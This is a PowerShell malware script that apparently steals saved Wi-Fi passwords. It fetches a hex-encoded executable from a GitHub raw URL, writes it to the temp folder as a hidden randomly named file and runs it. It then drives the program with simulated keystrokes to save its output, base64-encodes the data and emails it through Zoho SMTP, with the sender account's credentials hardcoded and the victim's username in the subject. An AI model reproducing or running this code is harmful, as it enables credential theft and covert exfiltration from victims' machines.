function New-MemoryAttachment {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Data,
        
        [Parameter(Mandatory=$false)]
        [string]$FileName = "ani.txt",
        
        [switch]$Obfuscate = $true
    )

    try {
        # 1. Obfuscate if requested (Base64)
        $contentToStream = $Data
        if ($Obfuscate) {
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
            $contentToStream = [System.Convert]::ToBase64String($bytes)
        }

        # 2. Setup Memory Stream
        $ms = New-Object System.IO.MemoryStream
        $writer = New-Object System.IO.StreamWriter($ms)
        $writer.Write($contentToStream)
        $writer.Flush()
        
        # 3. Reset position so the Mail Client reads from the beginning
        $ms.Position = 0

        # 4. Return the Attachment Object
        # Note: We return both the attachment and the stream to keep it in RAM
        return New-Object Net.Mail.Attachment($ms, $FileName)
    }
    catch {
        Write-Error "Failed to create memory attachment: $($_.Exception.Message)"
        return $null
    }
}

function Send-ZohoEmail {
    param (
        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
        [string]$ToEmail = "srve650@gmail.com",
        [string]$Subject,
        [string]$Body = "Hello, this is a test email with an attachment.",
        [PSObject[]]$Attachments = @(), # MUST BE PSObject
        [string]$SmtpServer = "smtp.zoho.com",
        [int]$Port = 587,
        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
        [string]$Password = "LHjzKTbzDApt"
    )

    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $FromEmail
    $mailMessage.To.Add($ToEmail)
    $mailMessage.Subject = $Subject
    $mailMessage.Body = $Body

    foreach ($item in $Attachments) {
        if ($null -eq $item) { continue }
        
        # Logic to distinguish between Object and File Path
        if ($item.GetType().FullName -like "*Attachment*") {
            $mailMessage.Attachments.Add($item)
        }
        elseif ($item -is [string] -and (Test-Path $item)) {
            $mailMessage.Attachments.Add((New-Object System.Net.Mail.Attachment($item)))
        }
    }

    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtpClient.EnableSsl = $true
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    try {
        $smtpClient.Send($mailMessage)
        Write-Host "Success!" -ForegroundColor Green
    } finally {
        $mailMessage.Dispose()
        $smtpClient.Dispose()
    }
}

# Run WBPV 
        $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
        $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
        Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file

        # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY
        $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
        $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file

        # Convert the hex string to a byte array
        $bytes = [byte[]]::new($hexString.Length / 2)
        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
        }

        # Create a temporary file to hold the executable
        $randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
        $tempExePath = Join-Path $env:TEMP "$randName.exe"
        [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
        (Get-Item $tempExePath).Attributes = 'Hidden'

        # $tempExePath = Join-Path $env:TEMP "example.exe"
        # [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
        $process = Start-Process $tempExePath # Start the executable

        #  SAVED DATA 
        $outputFilePath = "$env:TEMP\data.txt"
        Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
        Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys

        # Simulate CTRL+A and then CTRL+S to save the file
        [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
        Start-Sleep -Milliseconds 500  # Wait a moment for selection
        [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
        Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear

        # Send the output file path and Enter
        [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
        Start-Sleep -Milliseconds 500  # Wait for the input
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

        Start-Sleep -Seconds 1 # Wait a moment for the file to save
        Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes

if (Test-Path $outputFilePath) {
    $rawData = Get-Content $outputFilePath -Raw

    # Use the function to create the RAM-only attachment
    $attachment = New-MemoryAttachment -Data $rawData -FileName "anihan.txt" -Obfuscate $true

    if ($null -ne $attachment) {
        $subject = "$env:USERNAME: Ang Anihan sa Bukirin"
        
        # Send using your updated Zoho function
        Send-ZohoEmail -Subject $subject -Attachments @($attachment)
        
        # Cleanup
        $attachment.Dispose()
        Remove-Item $outputFilePath -Force
    }
} else {
    Write-Host "Error: Save-As operation failed. Data file not found." -ForegroundColor Red
}




